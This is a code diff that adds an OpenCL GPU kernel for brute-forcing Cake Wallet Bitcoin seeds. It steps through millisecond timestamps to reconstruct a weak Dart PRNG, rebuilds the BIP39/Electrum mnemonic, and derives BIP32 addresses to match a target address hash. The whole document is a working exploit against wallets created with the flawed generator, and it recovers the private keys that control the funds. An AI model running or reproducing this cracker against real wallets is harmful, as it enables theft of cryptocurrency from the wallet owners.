@@ -195,3 +195,141 @@ __kernel void cake_wallet_crack(
         }
     }
 }
+
+// ─── cake_wallet_crack_ms ────────────────────────────────────────────────────
+// Timestamp-based cracker — correct mode for real Cake Wallet seeds.
+// Iterates millisecond timestamps, converts to microseconds (* 1000),
+// uses Dart PRNG (dart_prng.cl) to generate BIP39 entropy,
+// derives 40 P2WPKH addresses per timestamp: m/0'/{0,1}/{0..19}
+__kernel void cake_wallet_crack_ms(
+    __global ulong *results,
+    __global uint  *result_count,
+    ulong target_h160_part1,
+    ulong target_h160_part2,
+    uint  target_h160_part3,
+    ulong start_ms
+) {
+    ulong gid   = (ulong)get_global_id(0);
+    ulong ts_ms = start_ms + gid;
+    ulong ts_us = ts_ms * 1000UL;
+
+    // 1. Dart PRNG → 16-byte entropy
+    DartRandom rng;
+    dart_random_init(&rng, ts_us);
+    uchar entropy[16];
+    dart_random_generate_bytes(&rng, entropy, 16);
+
+    // 2. SHA-256 checksum (top 4 bits → 4 checksum bits for 12-word mnemonic)
+    uchar entropy_aligned[16] __attribute__((aligned(4)));
+    for (int i = 0; i < 16; i++) entropy_aligned[i] = entropy[i];
+    uchar entropy_hash[32] __attribute__((aligned(4)));
+    sha256((__private const uint *)entropy_aligned, 16, (__private uint *)entropy_hash);
+    uchar checksum = (entropy_hash[0] >> 4) & 0xF;
+
+    // 3. Extract 12 BIP39 word indices (11 bits each + 4 checksum bits)
+    ulong mnemonic_hi = 0, mnemonic_lo = 0;
+    for (int i = 0; i < 8; i++) mnemonic_hi |= ((ulong)entropy[i])     << (i * 8);
+    for (int i = 0; i < 8; i++) mnemonic_lo |= ((ulong)entropy[i + 8]) << (i * 8);
+
+    ushort idx[12];
+    idx[0]  = (mnemonic_hi >> 53) & 0x7FF;
+    idx[1]  = (mnemonic_hi >> 42) & 0x7FF;
+    idx[2]  = (mnemonic_hi >> 31) & 0x7FF;
+    idx[3]  = (mnemonic_hi >> 20) & 0x7FF;
+    idx[4]  = (mnemonic_hi >>  9) & 0x7FF;
+    idx[5]  = ((mnemonic_hi & 0x1FFUL) << 2) | ((mnemonic_lo >> 62) & 3);
+    idx[6]  = (mnemonic_lo >> 51) & 0x7FF;
+    idx[7]  = (mnemonic_lo >> 40) & 0x7FF;
+    idx[8]  = (mnemonic_lo >> 29) & 0x7FF;
+    idx[9]  = (mnemonic_lo >> 18) & 0x7FF;
+    idx[10] = (mnemonic_lo >>  7) & 0x7FF;
+    idx[11] = ((mnemonic_lo & 0x7FUL) << 4) | checksum;
+
+    // 4. Build mnemonic string
+    uchar mnemonic[256];
+    int mlen = 0;
+    for (int i = 0; i < 12; i++) {
+        if (i > 0) mnemonic[mlen++] = ' ';
+        int wi = idx[i];
+        int wl = word_lengths[wi];
+        for (int j = 0; j < wl; j++) mnemonic[mlen++] = words[wi][j];
+    }
+
+    // 5. Electrum prefix check — ~4095/4096 seeds exit here
+    if (!cake_wallet_validate_electrum_prefix(mnemonic, mlen)) return;
+
+    // 6. PBKDF2-HMAC-SHA512, salt="electrum", 2048 iterations
+    uchar seed[64]          __attribute__((aligned(8))) = {0};
+    uchar ipad_key[128]     __attribute__((aligned(4)));
+    uchar opad_key[128]     __attribute__((aligned(4)));
+    uchar sha512_result[64] __attribute__((aligned(8)));
+    uchar kp[256]           __attribute__((aligned(4)));
+
+    for (int x = 0; x < 128; x++) {
+        ipad_key[x] = (x < mlen) ? (mnemonic[x] ^ 0x36) : 0x36;
+        opad_key[x] = (x < mlen) ? (mnemonic[x] ^ 0x5c) : 0x5c;
+    }
+
+    uchar salt[12] = {101,108,101,99,116,114,117,109, 0,0,0,1}; // "electrum"+BE(1)
+
+    for (int x = 0; x < 128; x++) kp[x] = ipad_key[x];
+    for (int x = 0; x < 12;  x++) kp[128 + x] = salt[x];
+    sha512((__private ulong *)kp, 140, (__private ulong *)sha512_result);
+
+    for (int x = 0; x < 128; x++) kp[x] = opad_key[x];
+    for (int x = 0; x < 64;  x++) kp[128 + x] = sha512_result[x];
+    sha512((__private ulong *)kp, 192, (__private ulong *)sha512_result);
+
+    for (int x = 0; x < 64; x++) seed[x] = sha512_result[x];
+
+    for (int iter = 1; iter < 2048; iter++) {
+        for (int x = 0; x < 128; x++) kp[x] = ipad_key[x];
+        for (int x = 0; x < 64;  x++) kp[128 + x] = sha512_result[x];
+        sha512((__private ulong *)kp, 192, (__private ulong *)sha512_result);
+
+        for (int x = 0; x < 128; x++) kp[x] = opad_key[x];
+        for (int x = 0; x < 64;  x++) kp[128 + x] = sha512_result[x];
+        sha512((__private ulong *)kp, 192, (__private ulong *)sha512_result);
+
+        for (int x = 0; x < 64; x++) seed[x] ^= sha512_result[x];
+    }
+
+    // 7. BIP32: m / 0' / change / addr_idx
+    extended_private_key_t master_key;
+    new_master_from_seed(0, seed, &master_key);
+
+    extended_private_key_t account_key;
+    hardened_private_child_from_private(&master_key, &account_key, 0);
+
+    for (uint change = 0; change <= 1; change++) {
+        extended_private_key_t chain_key;
+        normal_private_child_from_private(&account_key, &chain_key, change);
+
+        for (uint ai = 0; ai < 20; ai++) {
+            extended_private_key_t addr_key;
+            normal_private_child_from_private(&chain_key, &addr_key, ai);
+
+            extended_public_key_t addr_pub;
+            public_from_private(&addr_key, &addr_pub);
+
+            uchar h160[20];
+            identifier_for_public_key(&addr_pub, h160);
+
+            ulong h1 = 0, h2 = 0; uint h3 = 0;
+            for (int i = 0; i < 8; i++) h1 |= ((ulong)h160[i])      << (i * 8);
+            for (int i = 0; i < 8; i++) h2 |= ((ulong)h160[i + 8])  << (i * 8);
+            for (int i = 0; i < 4; i++) h3 |= ((uint) h160[i + 16]) << (i * 8);
+
+            if (h1 == target_h160_part1 &&
+                h2 == target_h160_part2 &&
+                h3 == target_h160_part3) {
+                uint slot = atomic_inc(result_count);
+                if (slot < 1024) {
+                    results[slot * 3]     = ts_ms;
+                    results[slot * 3 + 1] = (ulong)change;
+                    results[slot * 3 + 2] = (ulong)ai;
+                }
+            }
+        }
+    }
+}
